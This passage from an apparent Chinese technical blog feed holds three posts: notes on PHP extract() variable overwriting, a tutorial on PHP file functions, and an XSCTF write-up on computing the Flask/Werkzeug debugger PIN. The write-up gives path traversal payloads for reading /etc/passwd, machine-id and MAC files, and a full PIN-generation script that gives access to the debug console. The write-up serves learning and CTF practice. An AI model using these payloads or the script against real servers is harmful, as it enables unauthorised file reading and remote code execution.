class="string">&#x27;nname&#x27;</span>=&gt;<span class="string">&#x27;JJG&#x27;</span>);</span><br><span class="line"><span class="variable">$nname</span>=<span class="string">&#x27;jjg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$names</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$lname</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nname</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231109225232660.png" alt="image-20231109225232660" /></p><p>值得注意的是，如果当前已经存在和数组关键字相同名称的变量，该变量值会被覆盖。也就是说通过extract()函数可以覆盖掉一些原本存在的变量值达到注入的效果。这一点在CTF的PHP代码审计中经常用到（划考点）。</p><p>不过extract()函数将元素转换为变量的前提是该元素的关键字必须符合PHP变量命名规范，也就是说以数字开头和包含空格的关键字将被跳过。</p><p>extract()函数还可以传递第二个参数extract_type，这里不多赘述，贴一段其他大佬的归纳总结。</p><blockquote><p><em>extract_type</em> - 可选项。<code>extract()</code>函数检查无效变量名称和与现有变量名称的冲突。 此参数指定如何处理无效和碰撞名称。可能的值 -</p><ul><li><em>EXTR_OVERWRITE</em> - 默认。 碰撞时，现有变量被覆盖。</li><li><em>EXTR_SKIP</em> - 碰撞时，现有的变量不会被覆盖</li><li><em>EXTR_PREFIX_SAME</em> - 碰撞时，变量名将被赋予一个前缀。</li><li><em>EXTR_PREFIX_ALL</em> - 所有的变量名都会被赋予一个前缀。</li><li><em>EXTR_PREFIX_INVALID</em> - 只有无效或数字变量名称才会被赋予前缀。</li><li><em>EXTR_IF_EXISTS</em> - 只覆盖当前符号表中的现有变量，否则什么都不做。</li><li><em>EXTR_PREFIX_IF_EXISTS</em> - 如果当前符号表中存在相同的变量，则只向变量添加前缀。</li><li><em>EXTR_REFS</em> - 提取变量作为参考。导入的变量仍然引用数组参数的值</li></ul><p>//更多请阅读：<a href="https://www.yiibai.com/php/php_function_extract.html">https://www.yiibai.com/php/php_function_extract.html</a></p></blockquote><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/57672472_p0.jpg" alt="57672472_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> PHP学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP碎碎念（二）——文件读取基础</title>
      <link href="/posts/4f880ad35e0e/"/>
      <url>/posts/4f880ad35e0e/</url>
      
        <content type="html"><![CDATA[<p>距离上一次更新PHP又过了很久……太多东西要学了。这次更新主要是因为遇到了新的需求，要用PHP开发一个平台后端，不得不再捡起来……</p><p>总之，继续启动！</p><hr /><p>这章我们主要粗略的过一遍PHP的数据储存和读取，节奏会比较快。之所以快马加鞭，是因为PHP的精髓不在这里。本章只涉及最基本的读取文件操作，大部分和C语言类似，而且目前储存数据更常用的是采取DBMS数据库来管理数据储存。所以本章只做简单的归纳，快速掌握就行。</p><h2 id="文件处理"><a class="markdownIt-Anchor" href="#文件处理"></a> 文件处理</h2><p>PHP的处理文件方式和C语言大致相同，都分为三步：</p><ol><li>打开文件。如果文件不存在就创建（写模式）或者报错/退出（读模式）</li><li>从文件中读取/写入数据</li><li>关闭文件</li></ol><p>接下来我们先从打开文件开始介绍，主要讲解一下函数。</p><h2 id="打开文件"><a class="markdownIt-Anchor" href="#打开文件"></a> 打开文件</h2><p>在PHP中打开文件，一般使用fopen()函数。除了传递需要打开的文件名外，还需要指定文件模式。</p><h3 id="fopen"><a class="markdownIt-Anchor" href="#fopen"></a> fopen()</h3><p>上文中提到的文件模式，主要有三点需要注意：</p><ol><li>只读/只写或者读/写</li><li>如果选择写模式，是覆盖原内容还是追加</li><li>可以使用二进制模式处理文件</li></ol><p>fopen支持上述三种模式，使用方法为<code>fopen(file_path,file_mode,[include_path,protocol])</code>。文件路径和文件模式是必选的，使用方法和C相同。主要参数如下，b表示二进制读/写。</p><ul><li>r，rb读文件</li><li>w，wb写文件</li><li>a，ab追加写文件</li></ul><p>后两者是可选的，include_path是一个布尔值，PHP根据它判断是否要搜索include_path，这个值在PHP的配置中设置；后者则是协议前缀，比如<code>http://</code>。</p><h4 id="通过ftp或者http打开文件"><a class="markdownIt-Anchor" href="#通过ftp或者http打开文件"></a> 通过FTP或者HTTP打开文件</h4><p>除了打开一个本地文件进行操作外，fopen()函数还支持通过FTP、HTTP等协议打开其他文件，这点可以在php.ini文件中设置。如果文件名以<code>http://</code>开头，则fopen()函数将建立一个到指定服务器的连接，并返回一个指向HTTP响应的指针。FTP情况同理。</p><h4 id="错误抑制符"><a class="markdownIt-Anchor" href="#错误抑制符"></a> 错误抑制符</h4><p>调用fopen()函数时可能会产生各种错误，比如权限不够无法读取文件，或者文件不存在。可以在调用fopen()函数前加上<code>@</code>错误抑制符来阻止PHP报错并用if语句来设置一个对用户更友好的自定义报错信息。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;order.txt&quot;</span>,<span class="string">&quot;ab&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="readfile"><a class="markdownIt-Anchor" href="#readfile"></a> readfile()</h3><p>向函数传递<strong>文件名</strong>，这个函数会把文件中所有的内容读取并输出至标准输出（浏览器）上，然后再关闭这个文件。</p><h3 id="fpassthru"><a class="markdownIt-Anchor" href="#fpassthru"></a> fpassthru()</h3><p>像这个函数传递<strong>文件指针</strong>，其余作用和readfile()函数相同。</p><h3 id="file"><a class="markdownIt-Anchor" href="#file"></a> file()</h3><p>file()函数和readfile()函数用法和效果相同，除此之外它还会把读取到的文件数据作为返回值发送到一个数组里。其中每一行都对应数组的一个元素。</p><h3 id="file_get_contents"><a class="markdownIt-Anchor" href="#file_get_contents"></a> file_get_contents()</h3><p>作用与readfile()函数相同，但是这个函数不会把文件内容回显到浏览器上，而是以字符串的形式返回。</p><h3 id="fread"><a class="markdownIt-Anchor" href="#fread"></a> fread()</h3><p>向函数传递一个文件指针和一个长度，函数将读取指定长度或者网络数据包结束前的部分。</p><h2 id="写文件"><a class="markdownIt-Anchor" href="#写文件"></a> 写文件</h2><p>在PHP中有很多写入文件的函数，下面一一列举。</p><h3 id="fwritefputs"><a class="markdownIt-Anchor" href="#fwritefputs"></a> fwrite()/fputs()</h3><p>fwrite的使用方法为<code>fwrite($fp,$outputstring);</code>，要求传入一个文件指针并将保存在<code>$outputstring</code>的字符串写入文件。fputs()是fwrite()函数的别名。</p><h3 id="file_put_contents"><a class="markdownIt-Anchor" href="#file_put_contents"></a> file_put_contents</h3><p>该函数原型如下所示。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">string</span> filename,</span><br><span class="line"><span class="keyword">string</span> data</span><br><span class="line">[,<span class="keyword">int</span> flags</span><br><span class="line">[,resource context]])</span><br></pre></td></tr></table></figure><p>它不需要使用fopen函数打开文件就可以将包含在data中的字符串写入到文件中。与之相匹配的函数是file_get_contents()。</p><h3 id="fgets"><a class="markdownIt-Anchor" href="#fgets"></a> fgets()</h3><p>传入一个文件指针，每次读入<strong>一行</strong>，直到读取到换行符<code>\n</code>或者文件结束符<code>EOF</code>结束。</p><h3 id="fgetss"><a class="markdownIt-Anchor" href="#fgetss"></a> fgetss()</h3><p>fgets()函数的变体，更加安全。它会把读取到的文件中所有的PHP和HTML标记符过滤。这样可以防止自己的HTML代码被破坏格式，或者读取到恶意的PHP代码。</p><h3 id="fgetcsv"><a class="markdownIt-Anchor" href="#fgetcsv"></a> fgetcsv()</h3><p>fgets()函数的另一个变体，向函数传入文件指针，读取长度和分隔符。函数会在读取到分隔符时自动换行，分隔符可以是制表符<code>\t</code>，空格等。如果不希望限制读取长度，可以将此参数设置为0。</p><h3 id="fgetc"><a class="markdownIt-Anchor" href="#fgetc"></a> fgetc()</h3><p>传入一个文件指针，一次读取一个<strong>字符</strong>。</p><h2 id="文件锁定"><a class="markdownIt-Anchor" href="#文件锁定"></a> 文件锁定</h2><p>之所以引入这个概念，是因为PHP会遇到与C语言中不一样的情况。假如在一个订单系统中有两位用户同时下单了最后一个商品，如果没有文件锁定就会导致紊乱。所以引入flock()函数，在一个用户打开文件进行操作时，其他用户无法对该文件进行操作。</p><h3 id="flock"><a class="markdownIt-Anchor" href="#flock"></a> flock()</h3><p>在任何一个文件被打开且在进行读写前，应该使用这个函数进行锁定。函数原型如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">flock</span>(resource fp,<span class="keyword">int</span> operation[,<span class="keyword">int</span>＆wouldblock])</span><br></pre></td></tr></table></figure><p>除了传入文件指针外，一样的要指定锁定模式。第三个参数是可选的，如果文件锁定导致进程堵塞，那么第三个参数的值将为true。</p><p>其中锁定模式总结如下。</p><table><thead><tr><th>操作值</th><th>意义</th></tr></thead><tbody><tr><td>LOCK_SH</td><td>读操作锁定。意味着文件可以共享，其他人可以读文件</td></tr><tr><td>LOCK_EX</td><td>写操作锁定。代表互斥，文件不能共享</td></tr><tr><td>LOCK_UN</td><td>释放锁定</td></tr><tr><td>LOCK_NB</td><td>防止在请求加锁时发生阻塞（Windows系统不支持）（我也不知道这是什么鬼）</td></tr></tbody></table><p>如果要使用flock()函数，就必须将其添加到所有使用文件的脚本中，否则没有意义。</p><p>使用flock()函数后，代码更加健壮，但是还不够好。因为加锁时仍然会产生竞争条件，这时候我们就需要DBMS数据库管理系统来帮助我们解决这个问题，后面再慢慢讲。</p><h2 id="关闭文件"><a class="markdownIt-Anchor" href="#关闭文件"></a> 关闭文件</h2><h3 id="fclose"><a class="markdownIt-Anchor" href="#fclose"></a> fclose()</h3><p>和C语言相同，向其传入一个文件指针，关闭成功返回true，否则返回false。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="feof"><a class="markdownIt-Anchor" href="#feof"></a> feof()</h3><p>判断一个文件是否读到文件结尾。</p><h3 id="file_exist"><a class="markdownIt-Anchor" href="#file_exist"></a> file_exist()</h3><p>判断一个文件是否存在。</p><h3 id="filesize"><a class="markdownIt-Anchor" href="#filesize"></a> filesize()</h3><p>查看一个文件的大小，单位为字节。</p><h3 id="unlink"><a class="markdownIt-Anchor" href="#unlink"></a> unlink()</h3><p>删除一个文件。</p><h3 id="rewind-fseek-ftell"><a class="markdownIt-Anchor" href="#rewind-fseek-ftell"></a> rewind()、fseek()、ftell()</h3><p>用于在文件中定位，用法和C语言相同，不多赘述（无论是PHP还是C语言用的都极少）。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300483.jpg" alt="300483" /></p>]]></content>
      
      
      <categories>
          
          <category> PHP学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文弄清楚Flask框架下该如何计算PIN码</title>
      <link href="/posts/17f3e1f6f317/"/>
      <url>/posts/17f3e1f6f317/</url>
      
        <content type="html"><![CDATA[<p>事情的起因是XSCTF决赛的一道题。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140751987.png" alt="image-20231106140751987" /></p><p>进入链接，查看题目。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140832584.png" alt="image-20231106140832584" /></p><p>到这里提示已经很明显了，Flask和debugger（调试模式）。在开发Flask应用中，如果开发人员忘记关闭调试模式，就可能会导致严重的安全隐患。</p><p>随便传递一个错误的参数，就可以看到页面报错的调试页面。点击红圈处，可以直观地观察到源码泄露。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141318438.png" alt="image-20231106141318438" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141334777.png" alt="image-20231106141334777" /></p><p>容易分析代码逻辑，这段Python代码将<code>filepath</code>和<code>textfile</code>拼合成一个文件路径并打开，读取该文件路径的内容。其中<code>filepath</code>的值为<code>./uploads/</code>,<code>textfile</code>参数可控。此时我们马上能想到目录穿越漏洞，导致文件任意读取。</p><p>构造payload为<code>?file=../../../../etc/passwd</code>，成功读取到敏感文件<code>/etc/passwd</code>，内含登录系统的用户信息。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106142312396.png" alt="image-20231106142312396" /></p><p>关于<code>/etc/passwd</code>文件更详细的解释可以参考这篇博客<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">非常详细的/etc/passwd解释_etc/passwd文件的内容和含义-CSDN博客</a>。</p><p>总之经过以上操作，我们成功验证了题目存在文件任意读漏洞，并且有了初步的思路：通过文件任意读读取敏感信息，计算出Flask控制台的PIN码从而获得开发者权限查看flag文件。</p><p>现在开始细聊如何计算PIN码。</p><h2 id="序言"><a class="markdownIt-Anchor" href="#序言"></a> 序言</h2><p>在计算PIN码之前，有一件事必须知道，Flask的PIN码计算仅和werkzeug的debug模块有关。</p><p><font color=red size=5><strong>和Python版本无关！！！</strong></font></p><p>在网络上大多数博客都会告诉你，Flask框架计算PIN码时在Python版本3.6时采用md5加密，在Python版本3.8开始使用sha1加密。但是实际上并没有Python版本为3.7就不能采用sha1加密的说法，仅与werkzeug的版本有关系。而现在绝大多数都是采用高版本的加密，也就是sha1。这一点极其重要，将直接影响我们后续用于计算PIN码时采用的脚本。</p><h3 id="什么是pin码"><a class="markdownIt-Anchor" href="#什么是pin码"></a> 什么是PIN码</h3><p>pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell。</p><h3 id="pin码如何生成"><a class="markdownIt-Anchor" href="#pin码如何生成"></a> PIN码如何生成</h3><p>pin码生成要六要素<br />1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测<br />2.modname 默认flask.app<br />3.appname 默认Flask<br />4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量<br />5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address<br />6.machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了</p><p>了解到这些之后，就可以正式开启算PIN了。</p><h2 id="获取username"><a class="markdownIt-Anchor" href="#获取username"></a> 获取username</h2><p>username参数指的是当前运行这个程序的用户名。这个比较好做，在文件任意读时读取<code> /etc/passwd</code>，猜测用户名就好。比如这道题的最下方出现了<code>xsctf</code>，我们猜测这就是用户名。有一些题目下可能没有特别特殊的用户名，这时候我们就只好猜测用户名为最上方的<code>root</code>。也就是说运行程序的是拥有root权限的管理员。</p><h2 id="获取modname"><a class="markdownIt-Anchor" href="#获取modname"></a> 获取modname</h2><p>一般来说这个值都是默认为<code>flask.app</code>，具体的获取方式每个版本都不同，比如可以通过<code>getattr(app, &quot;module&quot;, t.cast(object, app).class.module)</code>来获取modname。</p><h2 id="获取appname"><a class="markdownIt-Anchor" href="#获取appname"></a> 获取appname</h2><p>一般来说这个值也是默认为<code>Flask</code>，也可以通过<code>getattr(app, 'name', app.class.name)</code>方式获取。</p><h2 id="获取moddir"><a class="markdownIt-Anchor" href="#获取moddir"></a> 获取moddir</h2><p>moddir是flask所在的路径，可以通过<code>getattr(mod, 'file', None)</code>来获得，题目中一般通过查看debug的报错信息获得，如下图。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145402374.png" alt="image-20231106145402374" /></p><p>故本题中的路径为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code>。其实一般都是这个值，最多python版本可能会有差异。</p><h2 id="获取uuidnode"><a class="markdownIt-Anchor" href="#获取uuidnode"></a> 获取uuidnode</h2><p>网卡的mac地址的十进制，可以通过代码uuid.getnode()获得，也可以通过读取/sys/class/net/eth0/address获得，一般获取的是一串十六进制数，将其中的横杠去掉然后转十进制就行。</p><p>本题构造payload为<code>?file=../../../../sys/class/net/eth0/address</code>，结果如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145741537.png" alt="image-20231106145741537" /></p><p>例：02:42:ac:1e:00:02 =&gt; 2485378744322<br />也可以直接跑print(int(“02:42:ac:1e:00:02”.replace(“:”,“”),16))</p><h2 id="获取machine_id"><a class="markdownIt-Anchor" href="#获取machine_id"></a> 获取machine_id</h2><p>这里尤为重要。</p><p>如果我们能够实现文件任意读，就读取<code>/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>（注意python版本，可以通过上面的报错信息拿到），找到里面的<code>get_machine_id</code>方法，可以最直观的看到本题目计算Flask的machine_id的过程。</p><p>构造payload<code>?file=../../../../usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>，找到该方法。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106150726655.png" alt="image-20231106150726655" /></p><p>重点关注这一段代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">    <span class="comment">#依次打开&quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;两个文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span><span class="comment">#注意这个break，只要满足一个就退出循环</span></span><br><span class="line">                <span class="comment">#这里因为&quot;/etc/machine-id&quot;在前，所以优先级更高</span></span><br><span class="line">--snip--</span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment">#这里主要是针对docker机的，通过读取&quot;/proc/self/cgroup&quot;获取经过正则后的值，然后拼接在上一步的字符上</span></span><br><span class="line">        <span class="comment">#不同的题目环境正则条件也许不一样</span></span><br><span class="line">        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span> OSError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里很清楚的描述了machine_id码是如何计算的，值得一提的是每个题目的machine_id值计算也许会不一样，所以能读取该环境的<code>get_machine_id</code>函数是最好的方法。</p><p>这里再贴一段别的大佬博客中的解释。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. /etc/machine-id（一般仅非docker机有，截取全文）</span><br><span class="line">2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）</span><br><span class="line">3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）</span><br><span class="line"><span class="comment"># 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope</span></span><br><span class="line"><span class="comment"># 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面</span></span><br><span class="line">文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。</span><br><span class="line">文件3如果存在的话就截取，不存在的话就不用管</span><br><span class="line">最后machine-id=（文件1或文件2）+文件3（存在的话）</span><br></pre></td></tr></table></figure><p>重点是**<code>最后machine-id=（文件1或文件2）+文件3（存在的话）</code>**这段话。machine-id和boot-id只需取一个，machine的优先级更高，然后再与cgroup文件的内容拼接作为最终的machine-id值。值得一提的是cgroup的截取方法并不一定是仅截取最后一个斜杠的内容，根据题目正则条件的不同也有可能只取<code>/docker/</code>后的部分。</p><p>这里的XSCTF题目中machine-id和boot-id都有值，而cgroup文件为空，故只需要取machine-id文件的内容作为machine-id的值。构造payload为<code>?file=../../../../etc/machine-id</code>，读取machine-id为<code>6e1d32ebf38c587c4a41089c0c744c83</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106152333132.png" alt="image-20231106152333132" /></p><p>至此集齐了计算PIN码的所有条件。</p><h2 id="计算pin获得flag"><a class="markdownIt-Anchor" href="#计算pin获得flag"></a> 计算PIN&amp;获得flag</h2><p>下面给出脚本，为了避免werkzeug版本产生的歧义，脚本能够同时给出经过md5和sha1加密计算得到的PIN码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMd5Pin</span>(<span class="params">probably_public_bits, private_bits</span>):</span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSha1Pin</span>(<span class="params">probably_public_bits, private_bits</span>):</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">macToInt</span>(<span class="params">mac</span>):</span><br><span class="line">    mac = mac.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(mac, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = argparse.ArgumentParser(description = <span class="string">&quot;Calculate Python Flask Pin&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>,required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;运行flask用户的用户名&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--modname&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;flask.app&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;默认为flask.app&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--appname&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;Flask&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;默认为Flask&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--path&#x27;</span>, required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;getattr(mod, &#x27;__file__&#x27;, None):flask包中app.py的路径&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-M&#x27;</span>, <span class="string">&#x27;--MAC&#x27;</span>, required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;MAC地址&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--machineId&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;机器ID&quot;</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        args.username,</span><br><span class="line">        args.modname,</span><br><span class="line">        args.appname,</span><br><span class="line">        args.path</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        macToInt(args.MAC),</span><br><span class="line">        <span class="built_in">bytes</span>(args.machineId, encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">    md5Pin = getMd5Pin(probably_public_bits, private_bits)</span><br><span class="line">    sha1Pin = getSha1Pin(probably_public_bits, private_bits)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Md5Pin:  &quot;</span> + md5Pin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sha1Pin:  &quot;</span> + sha1Pin)</span><br></pre></td></tr></table></figure><p>向终端传入参数。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python 计算PIN_2.py -u xsctf -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 02:42:ac:1e:00:02 -i 6e1d32ebf38c587c4a41089c0c744c83</span><br></pre></td></tr></table></figure><p>计算结果如下，其中sha1的计算结果为：890-921-121</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106153806563.png" alt="image-20231106153806563" /></p><p>进入控制台，可以访问<code>/console</code>或者点击报错调试页面右边的那个黑格子，输入PIN码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106155043435.png" alt="image-20231106155043435" /></p><p>登录成功，执行命令。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span 